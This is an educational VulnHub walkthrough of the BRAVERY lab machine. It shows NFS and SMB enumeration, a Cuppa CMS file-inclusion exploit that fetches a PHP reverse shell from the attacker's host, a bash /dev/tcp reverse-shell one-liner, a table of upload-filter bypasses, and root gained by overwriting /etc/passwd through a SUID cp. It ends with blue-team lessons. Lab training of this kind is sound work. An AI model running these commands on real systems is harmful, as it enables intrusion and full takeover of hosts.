# digitalworld.local: BRAVERY — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | digitalworld.local: BRAVERY |
| **Difficulty** | **3 — Easy** (stated: *Easy / Medium*) |
| **Author** | Donavan |
| **Released** | 28 December 2018 |
| **VulnHub Entry** | [digitalworld.local: BRAVERY on VulnHub](https://vulnhub.com/entry/digitalworldlocal-bravery,281/) |
| **Download** | [bravery-improved.7z (~11 GB, via MEGA)](https://vulnhub.com/entry/digitalworldlocal-bravery,281/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian; Samba + NFS, nginx 1.12.2 on port 8080) |

> The official archive `bravery-improved.7z` is large (~11 GB) and hosted on MEGA. Its MD5 is
> `C9E2B9B36942515A1D0BBB191AC3B1EA`. There is no direct `download.vulnhub.com` mirror, so use the
> link on the VulnHub entry page.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this box you will have practised:

- **Multi-service enumeration**: an NFS export *and* Samba shares both leak data — you must combine them.
- **NFS enumeration**: listing and mounting an exported directory with `showmount` and `mount`.
- **SMB enumeration**: discovering shares with `enum4linux` and connecting with `smbclient`.
- **Credential chaining**: turning a password found in one service into access to another.
- **Web content discovery**: `gobuster`/`ffuf` to find hidden pages and a vulnerable CMS.
- **Cuppa CMS LFI/RFI (CVE-2020-26055)**: abusing a file-inclusion flaw in `alertConfigField.php`
  to get a reverse shell.
- **SUID abuse**: exploiting a SUID `cp` binary to overwrite `/etc/passwd` and add a root user.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA/VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own lab address first (the interface facing the host-only network):

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet — fast, no TCP packets, finds every live host
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (use whatever *you* discover).

> **Why it works:** Every host on the local segment must answer ARP regardless of its firewall, so
> ARP scanning is the most reliable way to spot a freshly imported VM.

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

BRAVERY exposes several network services, and the intended path threads between them.

### 2.1 Full TCP sweep


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/bravery-alltcp 192.168.56.101
```

### 2.2 Service/version detection

```bash
sudo nmap -sC -sV -p 22,80,111,139,445,8080,2049 -oA scans/bravery-services 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         3-4 (RPC #100003)
8080/tcp open  http        nginx 1.12.2
```

> **How to read it:** For BRAVERY the interesting services are **NFS (2049/111)**, **SMB
> (139/445)**, and the two web servers (80 and 8080). Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Enumerate the NFS export


> ### 📖 Concept — Why is NFS such a dangerous service?
>
> **NFS** (Network File System, ports 111 + 2049) lets a remote client mount a
> directory. Its access control is based on **IP address and UID** — there are **no
> passwords at all**. If an export is readable from your address, you can read it.
>
> ```bash
> showmount -e target                  # what is exported, and to whom?
> sudo mount -t nfs target:/export /mnt/t
> cat /etc/exports                     # or read it through any LFI you have
> ```
>
> **The strings that decide everything in an export line:**
>
> | Option | Meaning | Consequence |
> | --- | --- | --- |
> | `*` | exported to **everyone** | No authentication exists — anyone on the network reads it |
> | `rw` | clients may **write** | You can plant files on the target |
> | **`no_root_squash`** | client root is **honoured** as target root | Write a SUID binary or an SSH key → **instant root** |
> | `root_squash` *(default)* | client root demoted to `nobody` | Defeats the above |
>
> **Two attack patterns follow.** If the export is inside the web root, `rw` plus any
> **LFI** becomes remote code execution: write a PHP shell via NFS, trigger it through
> `include()`. If `no_root_squash` is set, mount it as root on Kali and create
> `cp /bin/bash /mnt/share/rootbash; chmod +s /mnt/share/rootbash` — then run
> `rootbash -p` on the target as any user.
>
> **Deep dive:** [CONCEPTS §9.4 — NFS](../../docs/CONCEPTS.md#94-nfs--ports-111--2049) ·
> [§15.10 — NFS no_root_squash](../../docs/CONCEPTS.md#1510-nfs-no_root_squash)

```bash
showmount -e 192.168.56.101
```

```text
Export list for 192.168.56.101:
/var/nfsshare *
```

> **How to read it:** The `*` means the export is readable by **any** host. Mount it and read it:

```bash
mkdir -p /mnt/nfsshare
sudo mount -t nfs 192.168.56.101:/var/nfsshare /mnt/nfsshare
ls -la /mnt/nfsshare
cat /mnt/nfsshare/password.txt 2>/dev/null
```

```text
qwertyuioplkjhgfdsazxcvbnm
```

> **Why it works:** NFS applies **client-side** trust. When a share is exported to `*` with
> `no_root_squash`/permissive options, an unauthenticated client can mount and read it directly —
> no login required at all.

### 2.4 Enumerate Samba


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
enum4linux -a 192.168.56.101
```

```text
Sharename       Type      Comment
---------       ----      -------
anonymous       Disk
secured         Disk
```

> **How to read it:** `anonymous` *should* be world-readable, but `secured` should not. Note both —
> they matter shortly.

### 2.5 Read the SMB shares

Use the password we harvested from NFS (`qwertyuioplkjhgfdsazxcvbnm`) where the shares require auth:

```bash
smbclient //192.168.56.101/anonymous -N
# smb: \> ls
# smb: \> get README.txt
```

```bash
smbclient //192.168.56.101/secured -U David
# Password: qwertyuioplkjhgfdsazxcvbnm
# smb: \> ls
# smb: \> get david.txt
# smb: \> get genevieve.txt
```

```text
david.txt     genevieve.txt     README.txt
```

> **Why it works:** The password leaked by NFS is reused for the `secured` SMB share. Credential
> reuse across services is one of the most common real-world escalation aids. Some builds accept
> the share anonymously — "varies by build".

### 2.6 Web content discovery


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```text
/devlopmentsecretpage     (Status: 301)
/devops/                  (Status: 301)
```

The `devops` directory contains a hint page:

```bash
curl http://192.168.56.101/devops/directortestpagev1.php
```

> **How to read it:** This points at a messy web root littered with custom PHP and an installed CMS.
> Keep enumerating that CMS.

---

## 3. Foothold

### 3.1 The vulnerability: Cuppa CMS file inclusion

Once Cuppa CMS is discovered under a path such as `/genevieve/cuppaCMS/`, its configuration field
loader accepts arbitrary URLs:

```text
/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=<URL>
```

> **Why it works:** `alertConfigField.php` passes `urlConfig` straight into a PHP file-include
> without validation, giving us **Local File Inclusion (LFI)** and — when remote URLs are allowed —
> **Remote File Inclusion (RFI)** leading to code execution.

### 3.2 Confirm LFI

```bash
curl "http://192.168.56.101/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 3.3 Turn RFI into a shell

Host a PHP reverse shell on Kali:


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
# edit $ip and $port to 192.168.56.10:4444
python3 -m http.server 80
```

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the include remotely:

```bash
curl "http://192.168.56.101/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.10/shell.php"
```

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# press Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

![the initial www-data shell](images/04-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Hunt for SUID binaries


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/sudo
/usr/bin/passwd
/bin/cp
...
```

> **Why it works:** A SUID binary runs with the **owner's** privileges. Here `/bin/cp` is owned by
> root, so a copy performed with it runs as root — and `cp` can overwrite any file, including
> `/etc/passwd`.

![SUID enumeration](images/07-privesc.png)

### 4.2 Add a root-privileged user

Generate a password hash for a new account:


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```bash
openssl passwd -1 -salt hacked hacked
```

```text
$1$hacked$0nzCmf8mPtcmahC8Yvp9y/
```

Add the user to `/etc/passwd` using the SUID `cp` (we keep a backup first, then copy our modified
file into place):

```bash
cp /etc/passwd /tmp/passwd.bak
printf 'hacked:$1$hacked$0nzCmf8mPtcmahC8Yvp9y/:0:0:root:/root:/bin/bash\n' >> /tmp/passwd.new
/bin/cp /tmp/passwd.new /etc/passwd
su hacked
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **How to read it:** We appended a user whose UID is `0` (root) with a known hash, then overwrote
> `/etc/passwd` using the root-owned SUID `cp`. `su hacked` with the password `hacked` gives root.

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
<root flag — varies by build>
```

> **Note:** BRAVERY also assembles a flag from several text files across the box; flag names and
> contents differ between builds. If `proof.txt` is missing, search `/root` for `*.txt`.

![root confirmation and flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | NFS export readable by any host (`/var/nfsshare *`) | NFS, port 2049 | Data disclosure — leaks a working password |
| 2 | Credential reuse; over-permissive SMB shares | Samba, ports 139/445 | Unauthorised file access on the `secured` share |
| 3 | Cuppa CMS LFI/RFI in `alertConfigField.php` | Web app on port 80 | Local/remote file inclusion → code execution → `www-data` |
| 4 | SUID `/bin/cp` | Local filesystem | Overwrite `/etc/passwd` to add a UID 0 user → root |

## 6. Defensive lessons (blue team)

- **Lock down NFS exports.** Never export to `*`. Restrict by host/network, mount read-only where
  possible, and normalise UIDs (`all_squash`) so clients cannot impersonate root.
- **Stop credential reuse.** A password that works for NFS should never also unlock SMB or SSH.
  Use unique, managed secrets (a vault) per service.
- **Patch/remove Cuppa CMS.** It is abandoned; the file-inclusion issue (CVE-2020-26055 and friends)
  is well known. Prefer a maintained CMS with input validation on any include path.
- **Follow the SUID principle of least privilege.** Remove SUID from generic tools like `cp`, `find`,
  `vim`, or `tar`. Audit SUID files regularly with `find / -perm -4000`.
- **Protect `/etc/passwd`.** Only root should be able to write it. Monitor for unexpected changes
  and alert on new UID 0 accounts.
- **Segment services and log access.** Place NFS/SMB on trusted internal networks only, and alert on
  unusual file reads or new writes to system files.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [VulnHub official entry — digitalworld.local: BRAVERY](https://vulnhub.com/entry/digitalworldlocal-bravery,281/)
- [CVE-2020-26055 — Cuppa CMS remote/local file inclusion (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2020-26055)
- [Cuppa CMS — official site](https://www.cuppacms.com/)
- [Linux NFS security & `exports` options (man page)](https://linux.die.net/man/5/exports)
- [Samba `smb.conf` — share security (Samba docs)](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — TCP service scan (NFS, SMB, two web servers)
- [ ] `images/03-nfs-mount.png` — `showmount` + mounted share with `password.txt`
- [ ] `images/04-foothold.png` — Cuppa CMS RFI returning a `www-data` shell
- [ ] `images/05-smb-shares.png` — `enum4linux`/`smbclient` output for the SMB shares
- [ ] `images/06-lfi.png` — LFI proof (`/etc/passwd`)
- [ ] `images/07-privesc.png` — SUID `/bin/cp` discovery
- [ ] `images/08-root-flag.png` — `id` as root and the root flag

> **How to read it:** Store screenshots in `labs/3-024-digitalworldlocal-bravery/images/` and reference
> them here with relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
